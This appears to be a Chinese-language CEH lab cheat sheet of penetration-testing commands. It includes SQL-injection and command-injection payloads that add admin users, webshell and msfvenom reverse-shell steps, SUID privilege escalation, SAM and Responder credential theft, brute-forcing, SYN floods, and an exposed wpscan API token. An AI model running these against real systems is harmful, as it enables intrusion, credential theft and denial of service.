- 如何判斷DC

| **Port** | **Protocol** | **Service** |
| --- | --- | --- |
| 53 | TCP/UDP | DNS |
| 88 | TCP/UDP | Kerberos authentication |
| 123 | UDP | W32Time |
| 135 | TCP | RPC Endpoint Mapper |
| 137/138 \* | UDP | NetBIOS |
| 139 \* | TCP | NetBIOS |
| 389 | TCP/UDP | LDAP（DC） |
| 445 | TCP | SMB |
| 464 | TCP/UDP | Kerberos password change |
| 636 | TCP | LDAP SSL |
| 9389 | TCP | Active Directory Web Services (ADWS) |
| 3268/3269 | TCP | LDAP Global Catalog / LDAP GC SSL |
| 49152-65535 | TCP | RPC Ephemeral Ports |

- 找到OS版本號碼
    - nmap -p3389 -A IP
- 利用CryptoForge 破解密碼
- 利用HashCalc取得HASH值（如CRC32）
- 在Linux用cp進行遠端複製
    - cp XXXX [nor@10.19.10.19](mailto:nor@10.19.10.19):.
- 利用more查看內容
    - more xxxxx
- 取得二進位檔內的字串資料
    - strings XX.bin
- 取得圖片檔之metadata
    - exiftool XXX.png
- 利用取得帳密列舉smb相關資訊
    - enum4linux -u USER -p PASSWORD -a IP
- 取得網段內netbios的資訊
    - nbtscan [10.10.10.1-254](https://10.10.10.1-254)
- 也可以使用crackmapexec取得smb相關資訊
    - 先升級impacket套件
        - python3 -m pip install --upgrade impacket
    - crackmapexec smb [10.10.10.16](https://10.10.10.16) -u martin -p apple --share
- 在windows 上查看smb資訊
    - net use \\[10.10.10.16](https://10.10.10.16) apple /u:martin
    - net use \\[10.10.10.16](https://10.10.10.16) \* /u:martin  (由跳出的視窗中輸入密碼)
    - net view \\[10.10.10.16](https://10.10.10.16)

**連入android**

    - adb connect IP:Port
    - adb devices
    - adb shell
    - sudo -
    - adb pull /sdcard (將/sdcard的資料download下來)

**列舉SNMP**

- 利用nmap找到主機群port的資訊
    - nmap -sVC IP
- nmap找snmp
    - nmap -sU -p161 IP
- 取得snmp資訊，並得知使用者帳號清單
    - 方法一：
        - snmp-check IP
    - 方法二：
        - nmap -sU -p161 --script snmp-win32-users IP
- 暴力列舉SNMP
    - nmap -sU -p161 --script snmp-brute
- 利用metasploit
    - use scanner/snmp/snmp\_login
    - use scanner/snmp/snmp\_enum
    - set rhosts [10.10.10.10](https://10.10.10.10) [10.10.10.16](https://10.10.10.16)
    - run

列舉NetBios

- nbtstat –A [10.10.10.16](https://10.10.10.16) (在windows)

用Enum4Linux列舉的方法

- enum4linux -u martin -p apple -U 10.10.10.12 -&gt; Users Enumeration
- enum4linux -u martin -p apple -o 10.10.10.12 -&gt; OS Enumeration
- enum4linux -u martin -p apple -P 10.10.10.12 -&gt; Password Policy Information
- enum4linux -u martin -p apple -G 10.10.10.12 -&gt; Groups Information
- enum4linux -u martin -p apple -S 10.10.10.12 -&gt; Share Policy Information (SMB Shares Enumeration)
- enum4linux -u USER -p PASSWORD -a IP

Nikto之使用於弱掃

- nikto -h http://www.goodshopping.com -Tuning 1
- nikto -h [http://www.goodshopping.com](http://www.goodshopping.com) -Tuning 1 的意思是讓 Nikto 對 [http://www.goodshopping.com](http://www.goodshopping.com) 執行掃描，僅檢查是否存在敏感或有趣的文件（例如，可能被錯誤暴露的備份文件或日誌文件）。
- 

**在OS裡找檔案及找尋字串**

- 在windows 裡找檔案
    - dir /s/a/p XXXXX
    - dir c:\norrith /s/a/p
        - 在C：＼下找尋norrith的檔案
    - dir c:\users\57 /s/a/p
        - 在c:\users下找尋檔案57
- 在windows裡的檔案找字串
    - find /I /N "world" myfile.txt (不區分大小寫，顯示包含"world" 的行及其行號)
    - findstr /S /I /N "error" \*.log (在所有 .log 檔案中，不區分大小寫，搜尋"error" 並顯示行號)
- 在Linux中找檔案
    - find . -name "XXXXX"
- 在Linux裡利用more查看內容
    - more xxxxx
- 在Linux裡的檔案找字串
    - grep -i "world" example.txt (查找包含"world" 或"WORLD" 的所有行（忽略大小寫）)
    - grep -r "test" . (遞歸搜索包含"test" 的所有文件（在當前目錄及其子目錄中）)
    - grep -n "pattern" output.txt (顯示 output.txt 文件中匹配行及其行號)
    - grep -v "error" log.txt (查找不包含"error" 的行)
    - grep -l "function" \*.c (只列出包含"function" 的文件名)
    - grep -c "success" output.log (統計包含"success" 的行數)

**在Linux下開啟CSV檔並且進行簡易查看**

- column -s, -t &lt; 123 | less -#2 -N -S

`column`用來整理輸入內容，使其以表格形式顯示

| 組件 | 說明 |
| --- | --- |
| `column` | 將資料整理成「欄狀」格式（table columns）顯示的工具 |
| `-s,` | 使用 `,`（逗號）作為欄位的分隔符號（separator） |
| `-t` | 自動對齊各欄位，輸出成「表格格式」（table） |
| `< 123` | 從檔案 `123` 讀入資料（`<` 是標準輸入導向符號） |

`less` 指令查看文字檔案的時候所使用的選項組合

| 參數 | 功能說明 |
| --- | --- |
| `-#2` | 設定橫向捲動的單位為 2 個字元（當你按下左右鍵時，每次橫向移動 2 格）（這個 `#` 是代表數值的符號，實際上是 `-#` 選項的一部分） |
| `-N` | 顯示每一行的行號（line numbers） |
| `-S` | 不自動換行（**S**uppress line wrapping）——如果一行太長，就用左右鍵橫向移動，而不是自動換行 |

- column -s$'\t' -t &lt; file.txt   # 使用 tab 分隔
- column -s: -t &lt; file.txt       # 使用冒號分隔

**Linux提權方法**

- Linux 提權
    - copy /usr/bin/bash .
    - chmod root bash
    - chmod 4755 ./bash
    - ./bash -p
    - id
- 將原本帳號加入sudor
    - visudo

**用HYDRA破密攻擊**

- 利用hydra破密
    - hydra -L user.list -P password.list smb://XXX
    - 密碼表在：
        - /usr/share/wordlists/nmap.lst
- 利用hydra破解RDP連線密碼
    - hydra -l UserName -P password.txt rdp://ip
- 利用hydra破解FTP連線密碼
    - hydra -L user.list -P passwordlist ftp://10.10.10.10

**SQLMAP之SQL注入攻擊法**

- 針對MSSQL Web之隱碼攻擊
    - wapiti -u &lt;url&gt; [-m sql] -&gt;This Will give the vulnerable parameter
    - 先登入並且取得cookie
    - sqlmap -u "url" --cookie="" --dbs
        - 變型，讓sqlmap自己去找插入點：
            - sqlmap -u "url" --forms --crawl=2 --cookie=""
    - sqlmap -u "url" --cookie="" -D XXX --tables
    - sqlmap -u "url" --cookie="" -D XXX -T DDD --columns --technique=B (technique=B表示用盲目攻擊方式)
    - sqlmap -u "url" --cookie="" -D XXX -T DDD --dump --technique=B (technique=B表示用盲目攻擊方式)
- 找到某個參數網頁
    - [http://aa.bb.com/?cid=99](http://aa.bb.com/?cid=99)
- 進入OS－Shell
    - sqlmap -u "[http://www.example.com/viewprofile.aspx?id=1](http://www.example.com/viewprofile.aspx?id=1)" --cookie="cookies xxx" --os-shell
    - 用whoami:
        - ommand standard output: 'nt service\mssql$sqlexpress'

**SQL Injection**

- 可以跳過login
    - blah' or 1=1 --
- 插入一個值
    - blah';insert into login values ('john','apple123');
- 建立DB
    - blah';create database mydatabase;
- 執行程式
    - blah';exec master..xp\_cmdshell 'ping www.moviescope.com -l 65000 -t'; --

**命令注入攻擊法**

- 如果具有command injection
    - 可以用管線
    - |whoami
- 常用的windows command injection指令
    - net users
    - net user XXXX /add
    - net localgroup Administrators
    - net localgroup Administrators XXXX /add
    - reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f
    - netstat -an | findstr :3389

**WebShell攻擊方法**

- 利用weevely製作webshell
    - weevely generate cehp XXXX.php
- 將製作出來的web shell上傳到網站上
- 利用weevely連線到後門
    - weevely [http://xxxxxx.php](http://xxxxxx.php) chep （網址要是上傳web shell的那個實際網址）
- 利用weevely下載檔案
    - file\_download 遠端 地端

**　**

**有關WordPress網站的查看方法**

- 使用whatweb取得web的相關資訊
    - whatweb [http://111.1.1.1/ceh](http://111.1.1.1/ceh)
- 以whatweb知道該網站為wordpress的網站後，可以再用wpscan取得使用者
    - wpscan --url [http://1.1.1.1](http://1.1.1.1) -e u
- 再以wpscan破密
    - wpscan --url [http://1.1.1.1](http://1.1.1.1) -P password-wordlist
- wpscan API Token
    - skfQiBi5IJDMK440vro4rJ1sUcHFNPmJDYREBuK2akk
- wpscan --url http://10.10.10.16:8080/ceh --api-token skfQiBi5IJDMK440vro4rJ1sUcHFNPmJDYREBuK2akk -P /usr/share/wordlists/nmap.lst
- 使用wpscan並且加上API Key得知漏洞

**以Metasploit來攻擊WordPress**

- msfdb init
- sudo service postgresql start
- msfconsole
- msf&gt; db\_status
- 可以使用search來進行查找
- search description:wordpress -o 123.csv (找尋description欄位內wordpress的值，並且進行輸出到123.csv檔案)
- use exploit/unix/webapp/wp\_admin\_shell\_upload
- 也可在找到出來後，用
    - use 1 (其中1為找出來後的編號)
- show info (呈現出更細緻的資訊)
- show options (呈現出選項)
- 接下來設定相關選項，常用如下：
    - set rhosts [10.10.10.16](https://10.10.10.16)
    - set rport 8080
    - set username XXXX
    - set password XXXX
    - set payload php/reverse\_php
    - set lhost XXXXX (如果本機有多個IP，則必須指定)
- 輸入完後，開始攻擊
    - exploit or run
- session管理
    - 如果成功攻擊進去，則就會有session
    - background 進入背景
    - sessions 取得session列表
    - sessions ID， 如sessions 2，表示進入第2個session
    - exit 離開session
- back 回去上一個選項

**使用Metasploit來列舉**

- nmap -sS -A XXXXX -oX TEST
- msfdb init
- service postgresql start
- msfconsole
- 以DB來列舉
    - &gt; db\_status
    - &gt; db\_import TEST
    - &gt; hosts
    - &gt; services
    - &gt; db\_nmap -sS -A IP
- 列舉SMB
    - &gt; use scanner/smb/smb\_version
    - &gt; set rhosts [10.10.10.1-10](https://10.10.10.1-10)
    - &gt; set threads 100
    - &gt; run

**使用hping3來列舉Ports**

- sudo hping3 --scan 1-3000 -S [10.10.10.10](https://10.10.10.10)
- sudo hping3 -c 3 [10.10.10.10](https://10.10.10.10)
- sudo hping3 [10.10.10.10](https://10.10.10.10) --udp --rand-source --data 500
- sudo hping3 -S [10.10.10.10](https://10.10.10.10) -p 80 -c 5

**分析Modbus**

- 首先filter出modbus
- 其分由client 下query，server回應response
- filter
    - modbus.func\_code ==1
    - 表示要找出讀取線圈的暫存器
- 在modbus區塊中
    - Client端
        - Bit Count: 3表示讀取3個線圈
    - Server端
        - Byte Count: 1表示一個byte
        - bit 0~2，0表示關閉，1表示開啟

**取出Windows 的SAM密碼**

- 參考：[NTUSTISC - AD Note - Lab(Brute Force SAM) - HackMD](https://hackmd.io/@SBK6401/S1KgaEz0h)
- 指令
    - reg save hklm\sam sam (帳號資料)
    - reg save hklm\system system (系統登錄)
- 到parrot
- 舊版：
    - 升級impacket：python3 -m pip install --upgrade impacket
    - impacket-secretsdump LOCAL -system system -sam sam -outputfile [10.10.10.10](https://10.10.10.10)
- 新版：
    - secretsdump LOCAL -system system -sam sam -outputfile [10.10.10.10](https://10.10.10.10)
- 利用ophcrack工具
    - 到windows
    - 載入pwdump，並選擇Table：vista free
    - 按下crack，即可破解hash的密碼
    - 按下save，輸出成檔案（不要輸出成CSV）

HASH破密(Linux)

- 首先先創建MD5的密碼
    - echo -n hello | md5sum | cut -d" " -f1 &gt;&gt; md5.txt
- 有關cut的用法

| 選項 | 說明 |
| --- | --- |
| `cut` | Unix/Linux 中用來擷取文字欄位的工具 |
| `-d" "` | 指定「分隔字元」為空格（delimiter is a space） |
| `-f1` | 只取第 1 欄（field 1） |

- sudo john md5.txt --format=raw-md5 （要用管理者去執行才能看到）
- john只要做過一次，再下一次指令，則表示不會再執行，請到~/.john/XXX.pot內查看
- 亦可以用：
    - [https://crackstation.net](https://crackstation.net)
    - 可用hashcat
        - hashcat -a 0 -m 0 &lt;hash file&gt; &lt;wordlist&gt; --&gt;raw md5

HASH處理(Windows)

- 網址：[https://hackmd.io/@Not/rkh6ff5nd](https://hackmd.io/@Not/rkh6ff5nd)
- certutil -hashfile  &lt;檔名&gt;  &lt;hash型別&gt;
- 使用命令:CertUtil [選項] -hashfile InFile [HashAlgorithm]透過檔案產生並顯示密碼編譯雜湊
- 選項:-Unicode – 以 Unicode 寫入重新導向的輸出-gmt – 用 GMT 格式顯示時間-seconds – 顯示時間 (秒，毫秒)-v – 詳細資訊操作-privatekey – 顯示密碼與私密金鑰資料-pin PIN – 智慧卡 PIN-sid WELL\_KNOWN\_SID\_TYPE – 數值 SID22 – 本機系統23 – 本機服務24 – 網路服務
- 雜湊演算法: MD2 MD4 MD5 SHA1 SHA256 SHA384 SHA512
- CertUtil -? – 顯示動詞清單 (命令清單)CertUtil -hashfile -? – 顯示 "hashfile" 命令的說明文字CertUtil -v -? – 顯示全部命令的所有說明文字

**使用Responder破解Windows 網路登入密碼**

- 在攻擊端輸入：sudo responder -I eth0
- 在受害者端隨意：\\noexists，出現後打帳密
- responder會將取得的密碼hash存在
    - /usr/share/responder/logs/SMB-NTLMv2-SSP-XXXXX.txt
- 使用john破密
    - john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-[10.10.10.10.txt](https://10.10.10.10.txt)
    - john會將破解的密碼存入：~/.john/john.pot

**破解無線網路密碼**

- WEP加密協定
    - aircrack-ng WEPcrack-01.cap
- WPA2加密協定
    - aircrack-ng WPA2crack-01.cap -w /usr/share/wordlists/nmap.lst
    - -w 後面接word lists
    - aircrack-ng -b &lt;bssid from wireshark&gt; -w &lt;path to word list&gt; &lt;pathto pcap file&gt;

**Windows 萬用加解密程式**

- CrypTool (在第20章密碼學章節)

**VeraCrypt**

- 用來製作加密磁碟機

**驗證檔案完整性（計算出檔案的hash值）**

- CertUtil (如上說明)
- HashMyFiles
    - Windows 程式

**將資料隱匿到圖檔裡**

- 使用openstego

**將資料隱匿到文字檔裡**

- 使用SNOW
- 隱匿
    - SNOW.EXE -C -p cehp -m "Passing score: 70" cehp.txt cehp2.txt (-C 表示要壓縮，-p 表示密碼，-m 表示訊息，後面加上&lt;輸入檔&gt; &lt;輸出檔&gt;)
- 解匿
    - SNOW.EXE -C -p cehp cehp2.txt

**使用Wireshark**

- 如要分析web form，則可以在：
    - Statistics/Protocol Hierarchy/HTML Form URL Encoded
    - 可以看到web form內使用者輸入的資訊
    - http.request.method == “POST” -&gt; Wireshark filter for filtering HTTP POST request
- 要重組TCP Stream，則：
    - 點選任一封包項目
    - 點Follow-&gt;TCP Stream，接下來可以在show and save data as "Hex Dump"，將資料下載下來
- 使用封包重組後，可以觀看，如果為圖檔：
    - 會有JFIF的字樣
    - 如果為njRAT，且有用遠端桌面，則在JFIF字樣前回堆6個字元組，其16進制值為"ff:d8:ff"
- 如何分析SYN Flood封包
    - 點選TCP/Flags，按右鍵Apply as Filter/Selected
- 如何分析Covert TCP流量
    - 資訊會放在每個IP的ID欄位內，一次一個字母，並以TCP SYN封包傳送
    - ip.src && ip.dst && tcp.srcport
- 分析MQTT
    - (mqtt) && (mqtt.msgtype == 3)
    - mqtt.msg == 48:65:6c:6c:6f:20:4d:51:54:54
    - message欄位可以看到MQTT Publish什麼資訊
    - Copy/as Printable Text 可以把訊息以TEXT型式copy出來

**SYN Flood**

- sudo hping3 --flood --rand-source -S -p 21 [10.10.10.10](https://10.10.10.10) (-S 為指定為SYN Flood)

**Convert TCP**

- 編譯：
    - gcc XXXX.c -o XXXX

**使用OpenVAS進行弱掃**

- admin/password

如何利用NFS的弱點進入、提權，並取得資料

- 先看有無開啟NFS服務
    - namp -sVC XXXXX
    - rpcbind 在2049 nfs
- Mount NFS
    - apt install nfs-common
    - service rpcbind start (systemctl start rpcbind)
    - showmount -e [10.10.10.10](https://10.10.10.10)
    - mount -t nfs [10.10.10.10:/home](https://10.10.10.10:/home) /mnt
- 提權
    - chown root bash
    - chmod 4755 ./bash
    - ./bash -p
    - id 看euid是否為root
- 找檔案
    - find . -name "檔名"

**BASE64解碼**

- 去cyberchef進行

FTP傳檔

- ftp IP
- 用hydra取得帳密
- get XXX.txt

如何使用smbclient指令來存取SMB

- smbclient //10.10.10.10/XXXXXX -U admin
- smbclient -L 10.10.10.10 -U admin 可以看到所分享出來的目錄
- get file.txt ~/Download/file.txt 用來取得檔案

如何進行Reverse TCP

- msfvenom -p php/meterpreter/reverse\_tcp LHOST=10.10.10.13 LPORT=4444 -f raw -o exploit.php
- 將exploit.php檔案上傳到網站
- msfconsole
- use exploit/multi/handler
- set payload php/meterpreter/reverse\_tcp
- set lhost
- run
- 透由browser去瀏覽該PHP檔案
- search -f "\*.png"
- download file.txt

**其它**

- 利用Detect It Easy（DIE）去分析執行檔
- 取得Windows 使用者之SID
    - wmic useraccount get name,sid
- 在parrot裡用Remmina連windows RDP
- nmap -Pn - -script vuln &lt;IP&gt; 用來進行基本弱掃
- 在parrot裡用下面指令處理base64
    - base64 -d &lt;File&gt; -&gt; 解碼
    - base64 &lt;File&gt; &gt; 111.txt -&gt; 編碼
- 使用hastcat來解開hash
    - hashcat -a 0 -m 0 &lt;hash file&gt; &lt;wordlist&gt; --&gt;raw md5
